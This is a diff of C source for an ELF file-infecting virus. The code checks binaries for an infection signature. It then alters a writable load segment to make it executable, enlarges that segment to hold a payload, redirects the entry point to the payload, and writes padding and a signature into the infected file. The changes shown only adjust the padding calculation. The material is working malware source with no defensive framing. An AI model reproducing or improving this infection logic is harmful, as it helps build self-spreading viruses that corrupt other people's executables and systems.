@@ -39,8 +39,8 @@ struct linux_dirent64 {
  int do_the_job(char file[],size_t size, char *path);
  int             ft_strncmp(const char *s1, const char *s2, size_t n);
  int infect(char path[],size_t path_length);
-void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_Addr old_e_entry,size_t padding);
-int     ft_isdigit(int c);
+ void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_Addr old_e_entry);
+ int     ft_isdigit(int c);
  int ft_isallnum(char *str);
  size_t	put_sig(int fd);
  bool	im_infected(char *data);
@@ -682,34 +682,34 @@ int do_the_job(char buff[],size_t size, char *path)
 	phdr = (Elf64_Phdr*) (buff + hdr->e_phoff);
 	// Increase section header offset by PAGE_SIZE
 
-	hdr->e_shoff += PAGE_SZ64 + 1080;
-size_t padding_before = 0;
-	for(int i=0; i < hdr->e_phnum - 1; i++){
+	hdr->e_shoff += PAGE_SZ64 + PAGE_SIZE*4;
+
+	for(int i=0; i < hdr->e_phnum; i++){
 		if(is_infected(buff + phdr[i].p_offset, phdr[i].p_filesz))
 		{
 //			write(1,"r",1);
 			return (1);
 
 		}
-		if(phdr[i].p_type == PT_LOAD && phdr[i].p_flags == (PF_R | PF_W)) {
+		if(phdr[i].p_type == PT_LOAD && phdr[i].p_flags == (PF_R | PF_W)){
 
-            padding_before = phdr[i + 1].p_vaddr + phdr[i + 1].p_filesz - phdr[i].p_vaddr + phdr[i].p_filesz;
+
 
 			//puts("text found");
 			text_end = phdr[i].p_offset + phdr[i].p_filesz;
-			payload_vaddr = phdr[i].p_vaddr + phdr[i].p_filesz + padding_before;
+			payload_vaddr = phdr[i].p_vaddr + phdr[i].p_filesz + PAGE_SIZE*4;
 
 
 			hdr->e_entry = payload_vaddr + SIZE_BEFORE_ENTRY_POINT + 0;
 			//ft_putnbr(payload_vaddr);
 
 
-			entry =  (phdr[i].p_paddr + phdr[i].p_filesz  + padding_before+ SIZE_BEFORE_ENTRY_POINT)- entry;
+			entry =  (phdr[i].p_paddr + phdr[i].p_filesz  + PAGE_SIZE*4+ SIZE_BEFORE_ENTRY_POINT)- entry;
 
-			phdr[i].p_filesz += payload_len +100 + padding_before;
-			phdr[i].p_memsz += payload_len + 100 + padding_before;
+			phdr[i].p_filesz += payload_len +100 +PAGE_SIZE*4;
+			phdr[i].p_memsz += payload_len + 100 + PAGE_SIZE*4;
 			phdr[i].p_flags |= PF_X;
-				new_file(buff,size,text_end, path,entry,padding_before);
+				new_file(buff,size,text_end, path,entry);
 			return 0;
 		}
 	}
@@ -758,7 +758,7 @@ char    *only_name(char *line)
 	return (line);
 }
 
-void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_Addr old_e_entry,size_t padding)
+void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_Addr old_e_entry)
 {
 	int fd;
 	char tmp[125];
@@ -799,7 +799,7 @@ void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_
 	unsigned long address_of_start_encrypt = get_eip() - ((char *)&yeah - (char *)&main_encrypt);
 	size_t size_wrote = 0;
 	size_t	value;
-	for (size_t j = 0; j<  padding;j++)
+	for (int j = 0; j< PAGE_SIZE *4;j++)
 		write(fd,"\0",1);
 	size_wrote =	put_sig(fd);
 	value = (address_of_start_encrypt - address_of_start);
